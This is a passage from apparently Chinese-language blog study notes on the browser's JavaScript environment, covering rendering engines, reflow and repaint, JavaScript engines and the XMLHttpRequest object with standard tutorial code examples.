<h4 id="1-3-浏览器的组成"><a href="#1-3-浏览器的组成" class="headerlink" title="1.3 浏览器的组成"></a>1.3 浏览器的组成</h4><p>浏览器的核心是两部分：渲染引擎和 JavaScript 解释器（又称 JavaScript 引擎）。</p>
<h5 id="1-3-1-渲染引擎"><a href="#1-3-1-渲染引擎" class="headerlink" title="1.3.1 渲染引擎"></a>1.3.1 渲染引擎</h5><p>渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。</p>
<p>不同的浏览器有不同的渲染引擎。</p>
<ul>
<li>Firefox：Gecko 引擎</li>
<li>Safari：WebKit 引擎</li>
<li>Chrome：Blink 引擎</li>
<li>IE: Trident 引擎</li>
<li>Edge: EdgeHTML 引擎</li>
</ul>
<p>渲染引擎处理网页，通常分成四个阶段。</p>
<ol>
<li>解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）。</li>
<li>对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）。</li>
<li>布局：计算出渲染树的布局（layout）。</li>
<li>绘制：将渲染树绘制到屏幕。</li>
</ol>
<p>以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。</p>
<h5 id="1-3-2-重流和重绘"><a href="#1-3-2-重流和重绘" class="headerlink" title="1.3.2 重流和重绘"></a>1.3.2 重流和重绘</h5><p>渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，称为“绘制”（paint）。它们都具有阻塞效应，并且会耗费很多时间和计算资源。</p>
<p>页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）。用户的互动也会触发重流和重绘，比如设置了鼠标悬停（<code>a:hover</code>）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。</p>
<p>重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。</p>
<p>大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，最小化所耗费的代价，而不会全局重新生成网页。</p>
<p>作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，而以底层 DOM 元素的变动代替；再比如，重绘<code>table</code>布局和<code>flex</code>布局，开销都会比较大。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;foobar&#x27;</span>);</span><br><span class="line"></span><br><span class="line">foo.style.color = <span class="string">&#x27;blue&#x27;</span>;</span><br><span class="line">foo.style.marginTop = <span class="string">&#x27;30px&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面的代码只会导致一次重绘，因为浏览器会累积 DOM 变动，然后一次性执行。</p>
<p>下面是一些优化技巧。</p>
<ul>
<li>读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。</li>
<li>缓存 DOM 信息。</li>
<li>不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。</li>
<li>使用<code>documentFragment</code>操作 DOM</li>
<li>动画使用<code>absolute</code>定位或<code>fixed</code>定位，这样可以减少对其他元素的影响。</li>
<li>只在必要时才显示隐藏元素。</li>
<li>使用<code>window.requestAnimationFrame()</code>，因为它可以把代码推迟到下一次重绘之前执行，而不是立即要求页面重绘。</li>
<li>使用虚拟 DOM（virtual DOM）库。</li>
</ul>
<p>下面是一个<code>window.requestAnimationFrame()</code>对比效果的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重流代价高</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doubleHeight</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> currentHeight = element.clientHeight;</span><br><span class="line">  element.style.height = (currentHeight * <span class="number">2</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_my_elements.forEach(doubleHeight);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重绘代价低</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doubleHeight</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> currentHeight = element.clientHeight;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    element.style.height = (currentHeight * <span class="number">2</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_my_elements.forEach(doubleHeight);</span><br></pre></td></tr></table></figure>
<p>上面的第一段代码，每读一次 DOM，就写入新的值，会造成不停的重排和重流。第二段代码把所有的写操作，都累积在一起，从而 DOM 代码变动的代价就最小化了。</p>
<h5 id="1-3-3-JavaScript-引擎"><a href="#1-3-3-JavaScript-引擎" class="headerlink" title="1.3.3 JavaScript 引擎"></a>1.3.3 JavaScript 引擎</h5><p>JavaScript 引擎的主要作用是，读取网页中的 JavaScript 代码，对其处理后运行。</p>
<p>JavaScript 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行都要调用解释器，系统开销较大，运行速度慢于编译型语言。</p>
<p>为了提高运行速度，目前的浏览器都将 JavaScript 进行一定程度的编译，生成类似字节码（bytecode）的中间代码，以提高运行速度。</p>
<p>早期，浏览器内部对 JavaScript 的处理过程如下：</p>
<ol>
<li>读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。</li>
<li>对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。</li>
<li>使用“翻译器”（translator），将代码转为字节码（bytecode）。</li>
<li>使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。</li>
</ol>
<p>逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。</p>
<p>字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JavaScript 虚拟机：</p>
<ul>
<li>Chakra (Microsoft Internet Explorer)</li>
<li>Nitro/JavaScript Core (Safari)</li>
<li>Carakan (Opera)</li>
<li>SpiderMonkey (Firefox)</li>
<li>V8 (Chrome, Chromium)</li>
</ul>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-浏览器环境概述</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0059</title>
    <url>/2021/06/01/%E6%89%93%E5%8D%A10059/</url>
    <content><![CDATA[<p><font color=#ffd400>童心童趣，无关年龄，愿我们都能永葆一份童真。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="5-XMLHttpRequest-对象"><a href="#5-XMLHttpRequest-对象" class="headerlink" title="5. XMLHttpRequest 对象"></a>5. XMLHttpRequest 对象</h3><h4 id="5-1-简介"><a href="#5-1-简介" class="headerlink" title="5.1 简介"></a>5.1 简介</h4><p>浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。</p>
<p>1999年，微软公司发布 IE 浏览器5.0版，第一次引入新功能：允许 JavaScript 脚本向服务器发起 HTTP 请求。这个功能当时并没有引起注意，直到2004年 Gmail 发布和2005年 Google Map 发布，才引起广泛重视。2005年2月，AJAX 这个词第一次正式提出，它是 Asynchronous JavaScript and XML 的缩写，指的是通过 JavaScript 的异步通信，从服务器获取 XML 文档从中提取数据，再更新当前网页的对应部分，而不用刷新整个网页。后来，AJAX 这个词就成为 JavaScript 脚本发起 HTTP 通信的代名词，也就是说，只要用脚本发起通信，就可以叫做 AJAX 通信。W3C 也在2006年发布了它的国际标准。</p>
<p>具体来说，AJAX 包括以下几个步骤。</p>
<ol>
<li>创建 XMLHttpRequest 实例</li>
<li>发出 HTTP 请求</li>
<li>接收服务器传回的数据</li>
<li>更新网页数据</li>
</ol>
<p>概括起来，就是一句话，AJAX 通过原生的<code>XMLHttpRequest</code>对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。现在，服务器返回的都是 JSON 格式的数据，XML 格式已经过时了，但是 AJAX 这个名字已经成了一个通用名词，字面含义已经消失了。</p>
<p><code>XMLHttpRequest</code>对象是 AJAX 的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有<code>XML</code>和<code>Http</code>，它实际上可以使用多种协议（比如<code>file</code>或<code>ftp</code>），发送任何格式的数据（包括字符串和二进制）。</p>
<p><code>XMLHttpRequest</code>本身是一个构造函数，可以使用<code>new</code>命令生成实例。它没有任何参数。</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br></pre></td></tr></table></figure>
<p>一旦新建实例，就可以使用<code>open()</code>方法指定建立 HTTP 连接的一些细节。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.example.com/page.php&#x27;</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码指定使用 GET 方法，跟指定的服务器网址建立连接。第三个参数<code>true</code>，表示请求是异步的。</p>
<p>然后，指定回调函数，监听通信状态（<code>readyState</code>属性）的变化。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.onreadystatechange = handleStateChange;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleStateChange</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，一旦<code>XMLHttpRequest</code>实例的状态发生变化，就会调用监听函数<code>handleStateChange</code></p>
<p>最后使用<code>send()</code>方法，实际发出请求。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>send()</code>的参数为<code>null</code>，表示发送请求的时候，不带有数据体。如果发送的是 POST 请求，这里就需要指定数据体。</p>
<p>一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新网页里面的相关部分，从而不打断用户正在做的事情。</p>
<p>注意，AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨域请求，就会报错（详见《同源政策》和《CORS 通信》两章）。</p>
<p>下面是<code>XMLHttpRequest</code>对象简单用法的完整例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 通信成功时，状态值为4</span></span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.status === <span class="number">200</span>)&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.error(xhr.statusText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(xhr.statusText);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/endpoint&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<h4 id="5-2-XMLHttpRequest-的实例属性"><a href="#5-2-XMLHttpRequest-的实例属性" class="headerlink" title="5.2 XMLHttpRequest 的实例属性"></a>5.2 XMLHttpRequest 的实例属性</h4><h5 id="5-2-1-XMLHttpRequest-readyState"><a href="#5-2-1-XMLHttpRequest-readyState" class="headerlink" title="5.2.1 XMLHttpRequest.readyState"></a>5.2.1 XMLHttpRequest.readyState</h5><p><code>XMLHttpRequest.readyState</code>返回一个整数，表示实例对象的当前状态。该属性只读。它可能返回以下值。</p>
<ul>
<li>0，表示 XMLHttpRequest 实例已经生成，但是实例的<code>open()</code>方法还没有被调用。</li>
<li>1，表示<code>open()</code>方法已经调用，但是实例的<code>send()</code>方法还没有调用，仍然可以使用实例的<code>setRequestHeader()</code>方法，设定 HTTP 请求的头信息。</li>
<li>2，表示实例的<code>send()</code>方法已经调用，并且服务器返回的头信息和状态码已经收到。</li>
<li>3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的<code>responseType</code>属性等于<code>text</code>或者空字符串，<code>responseText</code>属性就会包含已经收到的部分信息。</li>
<li>4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。</li>
</ul>
<p>通信过程中，每当实例对象发生状态变化，它的<code>readyState</code>属性的值就会改变。这个值每一次变化，都会触发<code>readyStateChange</code>事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">  <span class="comment">// 请求结束，处理服务器返回的数据</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 显示提示“加载中……”</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>xhr.readyState</code>等于<code>4</code>时，表明脚本发出的 HTTP 请求已经完成。其他情况，都表示 HTTP 请求还在进行中。</p>
<h5 id="5-2-2-XMLHttpRequest-onreadystatechange"><a href="#5-2-2-XMLHttpRequest-onreadystatechange" class="headerlink" title="5.2.2 XMLHttpRequest.onreadystatechange"></a>5.2.2 XMLHttpRequest.onreadystatechange</h5><p><code>XMLHttpRequest.onreadystatechange</code>属性指向一个监听函数。<code>readystatechange</code>事件发生时（实例的<code>readyState</code>属性变化），就会执行这个属性。</p>
<p>另外，如果使用实例的<code>abort()</code>方法，终止 XMLHttpRequest 请求，也会造成<code>readyState</code>属性变化，导致调用<code>XMLHttpRequest.onreadystatechange</code>属性。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open( <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://example.com&#x27;</span> , <span class="literal">true</span> );</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState !== <span class="number">4</span> || xhr.status !== <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<h5 id="5-2-3-XMLHttpRequest-response"><a href="#5-2-3-XMLHttpRequest-response" class="headerlink" title="5.2.3 XMLHttpRequest.response"></a>5.2.3 XMLHttpRequest.response</h5><p><code>XMLHttpRequest.response</code>属性表示服务器返回的数据体（即 HTTP 回应的 body 部分）。它可能是任何数据类型，比如字符串、对象、二进制对象等等，具体的类型由<code>XMLHttpRequest.responseType</code>属性决定。该属性只读。</p>
<p>如果本次请求没有成功或者数据不完整，该属性等于<code>null</code>。但是，如果<code>responseType</code>属性等于<code>text</code>或空字符串，在请求没有结束之前（<code>readyState</code>等于3的阶段），<code>response</code>属性包含服务器已经返回的部分数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">    handler(xhr.response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="5-2-4-XMLHttpRequest-responseType"><a href="#5-2-4-XMLHttpRequest-responseType" class="headerlink" title="5.2.4 XMLHttpRequest.responseType"></a>5.2.4 XMLHttpRequest.responseType</h5><p><code>XMLHttpRequest.responseType</code>属性是一个字符串，表示服务器返回数据的类型。这个属性是可写的，可以在调用<code>open()</code>方法之后、调用<code>send()</code>方法之前，设置这个属性的值，告诉浏览器如何解读返回的数据。如果<code>responseType</code>设为空字符串，就等同于默认值<code>text</code>。</p>
<p><code>XMLHttpRequest.responseType</code>属性可以等于以下值。</p>
<ul>
<li>“”（空字符串）：等同于<code>text</code>，表示服务器返回文本数据。</li>
<li>“arraybuffer”：ArrayBuffer 对象，表示服务器返回二进制数组。</li>
<li>“blob”：Blob 对象，表示服务器返回二进制对象。</li>
<li>“document”：Document 对象，表示服务器返回一个文档对象。</li>
<li>“json”：JSON 对象。</li>
<li>“text”：字符串。</li>
</ul>
<p>上面几种类型之中，<code>text</code>类型适合大多数情况，而且直接处理文本也比较方便。<code>document</code>类型适合返回 HTML / XML 文档的情况，这意味着，对于那些打开 CORS 的网站，可以直接用 Ajax 抓取网页，然后不用解析 HTML 字符串，直接对抓取回来的数据进行 DOM 操作。<code>blob</code>类型适合读取二进制数据，比如图片文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/path/to/image.png&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.responseType = <span class="string">&#x27;blob&#x27;</span>;</span><br><span class="line"></span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([xhr.response], &#123;<span class="attr">type</span>: <span class="string">&#x27;image/png&#x27;</span>&#125;);</span><br><span class="line">    <span class="comment">// 或者</span></span><br><span class="line">    <span class="keyword">var</span> blob = xhr.response;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<p>如果将这个属性设为<code>ArrayBuffer</code>，就可以按照数组的方式处理二进制数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/path/to/image.png&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.responseType = <span class="string">&#x27;arraybuffer&#x27;</span>;</span><br><span class="line"></span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> uInt8Array = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="built_in">this</span>.response);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = uInt8Array.length; i &lt; len; ++i) &#123;</span><br><span class="line">    <span class="comment">// var byte = uInt8Array[i];</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<p>如果将这个属性设为<code>json</code>，浏览器就会自动对返回数据调用<code>JSON.parse()</code>方法。也就是说，从<code>xhr.response</code>属性（注意，不是<code>xhr.responseText</code>属性）得到的不是文本，而是一个 JSON 对象。</p>
<h5 id="5-2-5-XMLHttpRequest-responseText"><a href="#5-2-5-XMLHttpRequest-responseText" class="headerlink" title="5.2.5 XMLHttpRequest.responseText"></a>5.2.5 XMLHttpRequest.responseText</h5><p><code>XMLHttpRequest.responseText</code>属性返回从服务器接收到的字符串，该属性为只读。只有 HTTP 请求完成接收以后，该属性才会包含完整的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/server&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">xhr.responseType = <span class="string">&#x27;text&#x27;</span>;</span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<h5 id="5-2-6-XMLHttpRequest-responseXML"><a href="#5-2-6-XMLHttpRequest-responseXML" class="headerlink" title="5.2.6 XMLHttpRequest.responseXML"></a>5.2.6 XMLHttpRequest.responseXML</h5><p><code>XMLHttpRequest.responseXML</code>属性返回从服务器接收到的 HTML 或 XML 文档对象，该属性为只读。如果本次请求没有成功，或者收到的数据不能被解析为 XML 或 HTML，该属性等于<code>null</code>。</p>
<p>该属性生效的前提是 HTTP 回应的<code>Content-Type</code>头信息等于<code>text/xml</code>或<code>application/xml</code>。这要求在发送请求前，<code>XMLHttpRequest.responseType</code>属性要设为<code>document</code>。如果 HTTP 回应的<code>Content-Type</code>头信息不等于<code>text/xml</code>和<code>application/xml</code>，但是想从<code>responseXML</code>拿到数据（即把数据按照 DOM 格式解析），那么需要手动调用<code>XMLHttpRequest.overrideMimeType()</code>方法，强制进行 XML 解析。</p>
<p>该属性得到的数据，是直接解析后的文档 DOM 树。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/server&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">xhr.responseType = <span class="string">&#x27;document&#x27;</span>;</span><br><span class="line">xhr.overrideMimeType(<span class="string">&#x27;text/xml&#x27;</span>);</span><br><span class="line"></span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(xhr.responseXML);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<h5 id="5-2-7-XMLHttpRequest-responseURL"><a href="#5-2-7-XMLHttpRequest-responseURL" class="headerlink" title="5.2.7 XMLHttpRequest.responseURL"></a>5.2.7 XMLHttpRequest.responseURL</h5><p><code>XMLHttpRequest.responseURL</code>属性是字符串，表示发送数据的服务器的网址。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://example.com/test&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 返回 http://example.com/test</span></span><br><span class="line">  <span class="built_in">console</span>.log(xhr.responseURL);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>注意，这个属性的值与<code>open()</code>方法指定的请求网址不一定相同。如果服务器端发生跳转，这个属性返回最后实际返回数据的网址。另外，如果原始 URL 包括锚点（fragment），该属性会把锚点剥离。</p>
<h5 id="5-2-8-XMLHttpRequest-status，XMLHttpRequest-statusText"><a href="#5-2-8-XMLHttpRequest-status，XMLHttpRequest-statusText" class="headerlink" title="5.2.8 XMLHttpRequest.status，XMLHttpRequest.statusText"></a>5.2.8 XMLHttpRequest.status，XMLHttpRequest.statusText</h5><p><code>XMLHttpRequest.status</code>属性返回一个整数，表示服务器回应的 HTTP 状态码。一般来说，如果通信成功的话，这个状态码是200；如果服务器没有返回状态码，那么这个属性默认是200。请求发出之前，该属性为<code>0</code>。该属性只读。</p>
<ul>
<li>200, OK，访问正常</li>
<li>301, Moved Permanently，永久移动</li>
<li>302, Moved temporarily，暂时移动</li>
<li>304, Not Modified，未修改</li>
<li>307, Temporary Redirect，暂时重定向</li>
<li>401, Unauthorized，未授权</li>
<li>403, Forbidden，禁止访问</li>
<li>404, Not Found，未发现指定网址</li>
<li>500, Internal Server Error，服务器发生错误</li>
</ul>
<p>基本上，只有2xx和304的状态码，表示服务器返回是正常状态。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ( (xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>)</span><br><span class="line">    || (xhr.status === <span class="number">304</span>) ) &#123;</span><br><span class="line">    <span class="comment">// 处理服务器的返回数据</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 出错</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>XMLHttpRequest.statusText</code>属性返回一个字符串，表示服务器发送的状态提示。不同于<code>status</code>属性，该属性包含整个状态信息，比如“OK”和“Not Found”。在请求发送之前（即调用<code>open()</code>方法之前），该属性的值是空字符串；如果服务器没有返回状态提示，该属性的值默认为“OK”。该属性为只读属性。</p>
<h5 id="5-2-9-XMLHttpRequest-timeout，XMLHttpRequestEventTarget-ontimeout"><a href="#5-2-9-XMLHttpRequest-timeout，XMLHttpRequestEventTarget-ontimeout" class="headerlink" title="5.2.9 XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout"></a>5.2.9 XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout</h5><p><code>XMLHttpRequest.timeout</code>属性返回一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于0，就表示没有时间限制。</p>
<p><code>XMLHttpRequestEventTarget.ontimeout</code>属性用于设置一个监听函数，如果发生 timeout 事件，就会执行这个监听函数。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;/server&#x27;</span>;</span><br><span class="line"></span><br><span class="line">xhr.ontimeout = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(<span class="string">&#x27;The request for &#x27;</span> + url + <span class="string">&#x27; timed out.&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="comment">// 处理服务器返回的数据</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.error(xhr.statusText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 指定 10 秒钟超时</span></span><br><span class="line">xhr.timeout = <span class="number">10</span> * <span class="number">1000</span>;</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<h5 id="5-2-10-事件监听属性"><a href="#5-2-10-事件监听属性" class="headerlink" title="5.2.10 事件监听属性"></a>5.2.10 事件监听属性</h5><p>XMLHttpRequest 对象可以对以下事件指定监听函数。</p>
<ul>
<li>XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数</li>
<li>XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数</li>
